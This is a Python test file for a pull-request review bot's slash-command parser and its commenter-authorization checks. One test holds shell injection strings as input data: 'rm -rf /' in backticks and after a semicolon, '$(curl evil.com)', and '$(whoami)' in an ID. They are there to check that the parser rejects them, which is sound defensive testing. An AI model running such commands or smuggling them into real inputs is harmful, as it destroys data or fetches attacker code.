"""Tests for /prevue command parser and commenter authorization (D-16)."""

from __future__ import annotations

import re
from unittest.mock import MagicMock, patch

import pytest
import responses

from prevue.commands import (
    USAGE_REPLY,
    WRITE_ACCESS_REPLY,
    Command,
    authorize_commenter,
    parse_command,
    run_command,
)
from prevue.dismiss import DismissEntry
from prevue.gate import ReviewConfig
from prevue.github.client import CommentContext
from prevue.github.comments import PriorFinding
from prevue.review import FORK_UNSUPPORTED_MSG

FP16 = "abc123def4567890"
THREAD_ID = "PRRT_kwDOAbc123"
REPO_FULL = "owner/prevue"
ISSUE_NUMBER = 42
BASE_SHA = "base000def456789012345678901234567890abcd"
HEAD_SHA = "abc123def456789012345678901234567890abcd"


class TestParseCommandReview:
    def test_review_no_args(self) -> None:
        cmd = parse_command("/prevue review")
        assert cmd == Command(verb="review")

    def test_review_ignores_trailing_tokens(self) -> None:
        cmd = parse_command("/prevue review extra ignored tokens")
        assert cmd == Command(verb="review")

    def test_review_with_leading_whitespace(self) -> None:
        cmd = parse_command("  /prevue review")
        assert cmd == Command(verb="review")


class TestParseCommandDismiss:
    def test_dismiss_fingerprint(self) -> None:
        cmd = parse_command(f"/prevue dismiss {FP16}")
        assert cmd == Command(verb="dismiss", id=FP16)

    def test_dismiss_thread_id(self) -> None:
        cmd = parse_command(f"/prevue dismiss {THREAD_ID}")
        assert cmd == Command(verb="dismiss", id=THREAD_ID)

    def test_dismiss_with_reason(self) -> None:
        cmd = parse_command(f"/prevue dismiss {FP16} reason: false positive on naming")
        assert cmd == Command(
            verb="dismiss",
            id=FP16,
            reason="false positive on naming",
        )

    def test_dismiss_reason_bounded_to_500_chars(self) -> None:
        long_reason = "x" * 600
        cmd = parse_command(f"/prevue dismiss {FP16} reason: {long_reason}")
        assert cmd is not None
        assert cmd.reason is not None
        assert len(cmd.reason) == 500

    def test_dismiss_missing_id_returns_none(self) -> None:
        assert parse_command("/prevue dismiss") is None

    def test_dismiss_malformed_id_returns_none(self) -> None:
        assert parse_command("/prevue dismiss short") is None
        assert parse_command("/prevue dismiss abc") is None
        assert parse_command("/prevue dismiss bad;id") is None
        assert parse_command("/prevue dismiss has space") is None


class TestParseCommandResolve:
    def test_resolve_fingerprint(self) -> None:
        cmd = parse_command(f"/prevue resolve {FP16}")
        assert cmd == Command(verb="resolve", id=FP16)

    def test_resolve_thread_id(self) -> None:
        cmd = parse_command(f"/prevue resolve {THREAD_ID}")
        assert cmd == Command(verb="resolve", id=THREAD_ID)

    def test_resolve_missing_id_returns_none(self) -> None:
        assert parse_command("/prevue resolve") is None


class TestParseCommandRejections:
    def test_unknown_verb_returns_none(self) -> None:
        assert parse_command("/prevue delete everything") is None

    def test_prevue_not_at_line_start_ignored(self) -> None:
        assert parse_command("please /prevue review") is None

    def test_only_first_prevue_line_honored(self) -> None:
        body = "/prevue review\n/prevue dismiss abc123def4567890"
        cmd = parse_command(body)
        assert cmd == Command(verb="review")

    def test_prevue_inside_code_block_ignored(self) -> None:
        body = """Some context:
```
/prevue review
```
/prevue dismiss abc123def4567890"""
        cmd = parse_command(body)
        assert cmd == Command(verb="dismiss", id=FP16)

    def test_empty_body_returns_none(self) -> None:
        assert parse_command("") is None


class TestParseCommandInjection:
    @pytest.mark.parametrize(
        "body",
        [
            f"/prevue dismiss {FP16} reason: `rm -rf /`",
            f"/prevue dismiss {FP16} reason: $(curl evil.com)",
            f"/prevue dismiss {FP16}; rm -rf /",
            f"/prevue dismiss {FP16} && echo pwned",
            f"/prevue dismiss {FP16} reason: line1\nline2 injection",
            f"  /prevue dismiss {FP16} reason: leading ws ok",
        ],
        ids=[
            "backticks",
            "dollar-parens",
            "semicolon",
            "and-chain",
            "newline-in-reason",
            "leading-whitespace",
        ],
    )
    def test_injection_payloads_never_raise(self, body: str) -> None:
        result = parse_command(body)
        assert result is None or isinstance(result, Command)

    def test_injection_in_id_rejected(self) -> None:
        assert parse_command(f"/prevue dismiss {FP16};rm") is None
        assert parse_command("/prevue dismiss $(whoami)") is None


def _register_collaborator_permission(
    rsps: responses.RequestsMock,
    login: str,
    permission: str,
) -> None:
    owner, repo = REPO_FULL.split("/")
    rsps.add(
        responses.GET,
        re.compile(
            rf"https://api\.github\.com(?::443)?/repos/{owner}/{repo}/collaborators/{re.escape(login)}/permission/?$"
        ),
        json={"permission": permission, "user": {"login": login}},
        status=200,
    )


@responses.activate
@pytest.mark.parametrize(
    ("permission", "expected"),
    [
        ("maintain", True),
        ("write", True),
        ("admin", True),
        ("read", False),
        ("none", False),
    ],
)
def test_authorize_commenter_by_permission(permission: str, expected: bool) -> None:
    login = "alice"
    _register_collaborator_permission(responses.mock, login, permission)
    repo = MagicMock()
    repo.get_collaborator_permission.return_value = permission

    assert authorize_commenter(repo, login) is expected


@responses.activate
def test_authorize_commenter_denies_collaborator_with_read_permission() -> None:
    """Fact 5: author_association COLLABORATOR does not imply write access."""
    login = "external-readonly"
    _register_collaborator_permission(responses.mock, login, "read")
    repo = MagicMock()
    repo.get_collaborator_permission.return_value = "read"

    assert authorize_commenter(repo, login) is False


def _comment_ctx(**overrides: object) -> CommentContext:
    defaults = {
        "repo_full": REPO_FULL,
        "issue_number": ISSUE_NUMBER,
        "comment_body": "/prevue review",
        "comment_author": "alice",
        "author_association": "MEMBER",
        "head_repo_full": REPO_FULL,
        "base_repo_full": REPO_FULL,
        "head_sha": HEAD_SHA,
        "base_sha": BASE_SHA,
    }
    defaults.update(overrides)
    return CommentContext(**defaults)  # type: ignore[arg-type]


def _authorized_repo() -> MagicMock:
    repo = MagicMock()
    repo.get_collaborator_permission.return_value = "write"
    return repo


class TestRunCommandDispatch:
    def test_unauthorized_posts_write_access_reply_no_engine(self) -> None:
        mock_pr = MagicMock()
        mock_repo = MagicMock()
        mock_repo.get_collaborator_permission.return_value = "read"

        with (
            patch("prevue.commands.load_comment_context", return_value=_comment_ctx()),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands.run_review") as mock_review,
        ):
            assert run_command() == 0

        mock_pr.create_issue_comment.assert_called_once_with(WRITE_ACCESS_REPLY)
        mock_review.assert_not_called()

    def test_fork_pr_refused_no_engine(self) -> None:
        mock_pr = MagicMock()
        mock_repo = _authorized_repo()

        with (
            patch(
                "prevue.commands.load_comment_context",
                return_value=_comment_ctx(
                    head_repo_full="forker/prevue",
                    base_repo_full=REPO_FULL,
                ),
            ),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands.run_review") as mock_review,
        ):
            assert run_command() == 0

        mock_pr.create_issue_comment.assert_called_once_with(FORK_UNSUPPORTED_MSG)
        mock_review.assert_not_called()

    def test_unparseable_body_posts_usage_reply(self) -> None:
        mock_pr = MagicMock()
        mock_repo = _authorized_repo()

        with (
            patch(
                "prevue.commands.load_comment_context",
                return_value=_comment_ctx(comment_body="please /prevue review"),
            ),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands.run_review") as mock_review,
        ):
            assert run_command() == 0

        mock_pr.create_issue_comment.assert_called_once_with(USAGE_REPLY)
        mock_review.assert_not_called()

    def test_review_dispatches_force_full(self) -> None:
        mock_pr = MagicMock()
        mock_repo = _authorized_repo()

        with (
            patch("prevue.commands.load_comment_context", return_value=_comment_ctx()),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands.run_review") as mock_review,
        ):
            assert run_command() == 0

        mock_review.assert_called_once()
        assert mock_review.call_args.kwargs["force_full"] is True
        mock_pr.create_issue_comment.assert_not_called()


class TestRunCommandDismissCreate:
    def test_dismiss_nonexistent_ident_refused_no_sticky_change(self) -> None:
        mock_pr = MagicMock()
        mock_repo = _authorized_repo()

        with (
            patch(
                "prevue.commands.load_comment_context",
                return_value=_comment_ctx(
                    comment_body=f"/prevue dismiss {FP16} reason: noise",
                ),
            ),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands._load_review_cfg"),
            patch(
                "prevue.commands.create_dismiss_entry",
                return_value=f"no open finding matches `{FP16}`",
            ) as mock_create,
        ):
            assert run_command() == 0

        mock_create.assert_called_once()
        mock_pr.create_issue_comment.assert_called_once_with(f"no open finding matches `{FP16}`")

    def test_dismiss_error_without_reason_refused(self) -> None:
        mock_pr = MagicMock()
        mock_repo = _authorized_repo()

        with (
            patch(
                "prevue.commands.load_comment_context",
                return_value=_comment_ctx(comment_body=f"/prevue dismiss {FP16}"),
            ),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands._load_review_cfg"),
            patch(
                "prevue.commands.create_dismiss_entry",
                return_value="dismissing an error requires a reason",
            ),
        ):
            assert run_command() == 0

        mock_pr.create_issue_comment.assert_called_once_with(
            "dismissing an error requires a reason"
        )

    def test_dismiss_warning_appends_entry_to_sticky(self) -> None:
        from prevue.gate import ReviewConfig

        mock_pr = MagicMock()
        mock_repo = _authorized_repo()
        entry = DismissEntry(
            fingerprint=FP16,
            path="src/a.py",
            region=(3, 3),
            side="RIGHT",
            severity="warning",
            actor="alice",
            timestamp="2026-06-16T00:00:00+00:00",
            reason="false positive",
        )
        captured: dict[str, object] = {}

        def fake_create(*_args, **kwargs) -> DismissEntry:
            captured["ident"] = kwargs["ident"]
            captured["reason"] = kwargs["reason"]
            return entry

        with (
            patch(
                "prevue.commands.load_comment_context",
                return_value=_comment_ctx(
                    comment_body=f"/prevue dismiss {FP16} reason: false positive",
                ),
            ),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands._load_review_cfg", return_value=ReviewConfig(max_dismissals=2)),
            patch("prevue.commands.create_dismiss_entry", side_effect=fake_create),
        ):
            assert run_command() == 0

        assert captured["ident"] == FP16
        assert captured["reason"] == "false positive"
        reply = mock_pr.create_issue_comment.call_args[0][0]
        assert FP16 in reply
        assert "alice" in reply


class TestRunCommandResolve:
    def test_resolve_live_fingerprint_calls_resolve_review_thread(self) -> None:
        mock_pr = MagicMock()
        mock_repo = _authorized_repo()
        prior = PriorFinding(
            path="src/a.py",
            line=1,
            side="RIGHT",
            title="Bug",
            fingerprint=FP16,
            severity="warning",
            thread_id=THREAD_ID,
        )

        with (
            patch(
                "prevue.commands.load_comment_context",
                return_value=_comment_ctx(comment_body=f"/prevue resolve {FP16}"),
            ),
            patch("prevue.commands._get_repo_and_pull", return_value=(mock_repo, mock_pr)),
            patch("prevue.commands.derive_prior_findings", return_value=[prior]),
            patch("prevue.commands.resolve_review_thread", return_value=True) as mock_resolve,
        ):
            assert run_command() == 0

        mock_resolve.assert_called_once_with(THREAD_ID)
        assert "Resolved" in mock_pr.create_issue_comment.call_args[0][0]


class TestCreateDismissEntryUnit:
    def test_dismiss_create_appends_bounded_sticky_block(self) -> None:
        from prevue.dismiss import create_dismiss_entry, parse_dismiss_block
        from prevue.gate import ReviewConfig
        from prevue.github.comments import render_marker

        prior = PriorFinding(
            path="src/a.py",
            line=3,
            side="RIGHT",
            title="Lint noise",
            fingerprint=FP16,
            severity="warning",
            thread_id=THREAD_ID,
        )
        mock_pr = MagicMock()
        mock_pr.head.sha = HEAD_SHA
        sticky = MagicMock()
        sticky.user.login = "github-actions[bot]"
        sticky.user.type = "Bot"
        sticky.body = f"{render_marker(HEAD_SHA)}\n## Prevue Review\n\n### Metadata\nEngine: fake"
        mock_pr.get_issue_comments.return_value = [sticky]

        with (
            patch("prevue.github.comments.derive_prior_findings", return_value=[prior]),
            patch("prevue.github.comments._upsert_marker_comment") as mock_upsert,
        ):
            result = create_dismiss_entry(
                mock_pr,
                ident=FP16,
                reason="false positive",
                actor="alice",
                owner="owner",
                repo="prevue",
                review_cfg=ReviewConfig(max_dismissals=1),
            )

        assert isinstance(result, DismissEntry)
        body = mock_upsert.call_args[0][1]
        entries = parse_dismiss_block(body)
        assert len(entries) == 1
        assert entries[0].fingerprint == FP16
        assert entries[0].reason == "false positive"
        assert entries[0].actor == "alice"

    def test_dismiss_create_error_with_reason_succeeds(self) -> None:
        from prevue.dismiss import create_dismiss_entry

        prior = PriorFinding(
            path="src/a.py",
            line=1,
            side="RIGHT",
            title="Critical",
            fingerprint=FP16,
            severity="error",
            thread_id=THREAD_ID,
        )
        mock_pr = MagicMock()
        mock_pr.head.sha = HEAD_SHA
        mock_pr.get_issue_comments.return_value = []

        with (
            patch("prevue.github.comments.derive_prior_findings", return_value=[prior]),
            patch("prevue.github.comments._upsert_marker_comment"),
        ):
            result = create_dismiss_entry(
                mock_pr,
                ident=FP16,
                reason="accepted risk",
                actor="alice",
                owner="owner",
                repo="prevue",
                review_cfg=ReviewConfig(max_dismissals=50),
            )

        assert isinstance(result, DismissEntry)
        assert result.severity == "error"
        assert result.reason == "accepted risk"
